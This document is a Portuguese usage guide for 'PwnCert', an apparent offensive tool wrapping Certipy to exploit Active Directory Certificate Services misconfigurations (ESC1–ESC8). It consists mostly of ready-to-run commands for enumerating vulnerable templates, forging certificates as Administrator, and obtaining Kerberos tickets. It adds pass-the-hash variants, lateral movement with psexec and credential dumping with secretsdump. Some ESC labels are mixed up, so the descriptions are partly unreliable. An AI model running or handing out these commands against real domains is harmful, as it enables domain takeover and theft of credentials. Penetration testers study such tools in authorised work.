# 🎯 Detecção e Exploração de Vulnerabilidades ESC com PwnCert

## 📋 RESUMO RÁPIDO

### ⚡ AUTOMÁTICO (Recomendado!)
```bash
python3 pwncert.py auto -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' 192.168.1.100
```
✅ Faz TUDO automaticamente em um comando!

---

## 🚀 COMANDOS PARA DETECÇÃO E EXPLORAÇÃO

### [STEP 1] ENUMERATION - Descobrir Templates Vulneráveis

```bash
# Básico
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local'

# Apenas vulneráveis
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' --vulnerable

# Apenas habilitados
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' --enabled

# Salvar em JSON
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  --vulnerable -j -o resultados.json

# Com stdout
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  --vulnerable -s
```

**Resultado esperado:**
- ✅ Lista de CAs disponíveis
- ✅ Templates vulneráveis encontrados
- ✅ Tipo de ESC detectado (ESC1, ESC3, ESC6, etc)

---

### [STEP 2] REQUEST - Requisitar Certificado

```bash
# ESC1 - Com SAN (Subject Alternative Name)
python3 pwncert.py req -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  -ca "datacom-CA" -t "User" -a "Administrator" -o admin_cert

# ESC3 - Com UPN
python3 pwncert.py req -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  -ca "datacom-CA" -t "Workstation" --upn "Administrator@seu_dominio.local"

# ESC6 - Com DNS
python3 pwncert.py req -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  -ca "datacom-CA" -t "User" -a "admin" --dns "dc.seu_dominio.local" -o admin_cert

# Com subject customizado
python3 pwncert.py req -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  -ca "datacom-CA" -t "User" --subject "CN=Administrator" -o admin_cert
```

**Parâmetros obrigatórios:**
- `-ca "CA_NAME"` - Nome da CA (do STEP 1)
- `-t "TEMPLATE"` - Template vulnerável (do STEP 1)
- `-a "USER"` ou `--upn "USER@DOMAIN"` - Usuário alvo

**Resultado esperado:**
- ✅ Arquivo `.pfx` com certificado (ex: `admin_cert.pfx`)

---

### [STEP 3] AUTH - Autenticar com Certificado

```bash
# Básico
python3 pwncert.py auth --pfx "admin_cert.pfx" -d 'seu_dominio.local'

# Gerar Kirbi (para Rubeus)
python3 pwncert.py auth --pfx "admin_cert.pfx" -d 'seu_dominio.local' -k

# Com DC específico
python3 pwncert.py auth --pfx "admin_cert.pfx" -d 'seu_dominio.local' \
  --dc-ip 192.168.1.100 -k

# Com username específico
python3 pwncert.py auth --pfx "admin_cert.pfx" -d 'seu_dominio.local' \
  --username-auth "Administrator" -k
```

**Resultado esperado:**
- ✅ Ticket Kerberos gerado
- ✅ Arquivo kirbi pronto para movimentação lateral

---

## 🔥 TIPOS DE ESC E COMO EXPLORAR

### ESC1 - Enrollment Agent (Subject Alternative Name)

**Descrição:** Template permite especificar SAN para outro usuário

**Comando:**
```bash
python3 pwncert.py req -u user -p pass -d domain -ca CA -t Template -a Administrator
```

**Resultado:** Certificado válido como Administrator

---

### ESC2 - Any Purpose Enrollment

**Descrição:** Template com "Any Purpose" extended key usage

**Comando:**
```bash
python3 pwncert.py req -u user -p pass -d domain -ca CA -t Template \
  --upn Administrator@domain
```

**Resultado:** Certificado válido para qualquer propósito

---

### ESC3 - Request Agent Signature (EnrollOnBehalfOf)

**Descrição:** Permitido requisitar certificado em nome de outro usuário

**Comando:**
```bash
python3 pwncert.py req -u user -p pass -d domain -ca CA -t SigningTemplate \
  --upn Administrator@domain
```

**Resultado:** Certificado para usuário administrativo

---

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Descrição:** Registry flag permite SAN em templates normais

**Comando:**
```bash
python3 pwncert.py req -u user -p pass -d domain -ca CA -t User -a Administrator
```

**Resultado:** SAN alterado para usuário alvo

---

### ESC8 - NTLM Relay

**Descrição:** Relay NTLM para servidor de enrolamento HTTP

**Comando:**
```bash
python3 pwncert.py relay -u user -p pass -d domain -ca CA -t Template
```

**Nota:** Requer infraestrutura especial, manual mais complexo

---

## 📊 EXEMPLO COMPLETO - DATACOM.NET.BR

### Opção 1: AUTOMÁTICO (Recomendado!)

```bash
# Exploração completa automática
python3 pwncert.py auto -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  --target-user 'Administrator' --log exploit.log --debug 192.168.1.100
```

✅ Automático faz:
1. Executa NetExec para enumeration
2. Detecta vulnerabilidades ESC
3. Identifica CA e templates
4. Requisita certificado
5. Gera ticket kirbi

---

### Opção 2: MANUAL (Passo a passo)

**Step 1 - Enumerar:**
```bash
python3 pwncert.py find -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  --vulnerable -j -o datacom_find.json

# Analisar resultado - procurar por:
# - CA name
# - Template vulnerável
# - Tipo de ESC
```

**Step 2 - Requisitar (exemplo com ESC1):**
```bash
python3 pwncert.py req -u 'seu_usuario' -p 'sua_senha' -d 'seu_dominio.local' \
  -ca "datacom-CA" -t "User" -a "Administrator" -o admin_cert
```

**Step 3 - Autenticar:**
```bash
python3 pwncert.py auth --pfx "admin_cert.pfx" -d 'seu_dominio.local' \
  --dc-ip 192.168.1.100 -k
```

**Resultado:** Ticket kirbi pronto para uso

---

## 🎯 VARIAÇÕES COM DIFERENTES AUTENTICAÇÕES

### Com Hash NTLM (Pass-the-Hash)

```bash
# Automático
python3 pwncert.py auto -u admin -H 'LM:NT' -d domain 192.168.1.100

# Find
python3 pwncert.py find -u admin -H 'LM:NT' -d domain --vulnerable

# Request
python3 pwncert.py req -u admin -H 'LM:NT' -d domain -ca CA -t Template -a admin
```

### Com DC IP Específico

```bash
python3 pwncert.py auto -u user -p pass -d domain --dc-ip 192.168.1.10 192.168.1.100
```

### Com Debug Mode

```bash
python3 pwncert.py auto -u user -p pass -d domain --debug 192.168.1.100
```

Mostra exatamente o que está sendo enviado para Certipy

---

## 💾 SALVANDO LOGS E RESULTADOS

### Salvar enumeration em arquivo

```bash
python3 pwncert.py find -u user -p pass -d domain --vulnerable -o results
# Gera: results.txt

python3 pwncert.py find -u user -p pass -d domain --vulnerable -j -o results_json
# Gera: results_json.json
```

### Salvar log da exploração automática

```bash
python3 pwncert.py auto -u user -p pass -d domain --log exploit.log 192.168.1.100
# Gera: exploit.log com todos os detalhes
```

---

## 🎯 CHECKLIST DE EXPLORAÇÃO

```
[ ] Verificar conectividade com DC
[ ] Confirmar credenciais válidas
[ ] Executar FIND para enumerar templates
[ ] Identificar tipo de ESC na saída
[ ] REQ com parâmetros corretos para o ESC
[ ] Verificar se .pfx foi gerado
[ ] AUTH com o .pfx
[ ] Verificar se ticket foi gerado
[ ] Usar ticket para movimentação lateral
```

---

## 📝 EXEMPLOS REAIS

### Exemplo 1: ESC1 em ambiente corporativo

```bash
# Enumerar
python3 pwncert.py find -u 'corp_admin' -p 'Pass@2024' -d 'corp.local' \
  --vulnerable -j -o corp_enum

# Requisitar
python3 pwncert.py req -u 'corp_admin' -p 'Pass@2024' -d 'corp.local' \
  -ca "CORP-ROOT-CA" -t "User" -a "domain_admin" -o da_cert

# Autenticar
python3 pwncert.py auth --pfx "da_cert.pfx" -d 'corp.local' \
  --dc-ip 192.168.1.5 -k

# Resultado: Ticket de domain_admin gerado
```

### Exemplo 2: ESC6 com hash

```bash
# Com NTLM hash
HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

python3 pwncert.py auto -u 'administrator' -H "$HASH" -d 'domain.local' \
  --target-user 'enterprise_admin' --debug 192.168.1.10
```

### Exemplo 3: ESC3 com UPN

```bash
python3 pwncert.py req -u 'user' -p 'pass' -d 'domain.local' \
  -ca "PKI-CA" -t "WorkstationTemplate" \
  --upn "Administrator@domain.local" -o admin_esc3

python3 pwncert.py auth --pfx "admin_esc3.pfx" -d 'domain.local' -k
```

---

## 🛠️ TROUBLESHOOTING

### "Got error: socket connection error"
- ❌ DC não está acessível
- ✅ Solução: Verificar IP do DC, firewall, conectividade

### "Certipy v5.0.3 - unrecognized arguments"
- ❌ Sintaxe errada dos argumentos
- ✅ Solução: Usar `-u user@domain` em vez de `-username` `-domain`

### Certificado não gerado
- ❌ Permissões insuficientes
- ❌ Template não é vulnerável
- ✅ Solução: Verificar output do FIND, tentar outro template

### Autenticação falha
- ❌ .pfx corrompido
- ❌ Formato incorreto
- ✅ Solução: Verificar se .pfx foi gerado corretamente

---

## 🔗 Próximos Passos com Ticket

Após gerar o ticket kirbi:

### Com Rubeus (Windows)
```
rubeus.exe ptt /ticket:base64ticket
```

### Com Impacket (Linux)
```bash
export KRB5CCNAME=./ticket.ccache
psexec.py -k -no-pass corp.local/Administrator@targethost
```

### Extrair secrets com Secretsdump
```bash
secretsdump.py -pfx admin_cert.pfx corp.local/Administrator@DC
```

---

**Desenvolvido por:** 0x13-ByteZer0  
**Versão:** 2.0+ Auto  
**Última atualização:** 27/11/2025
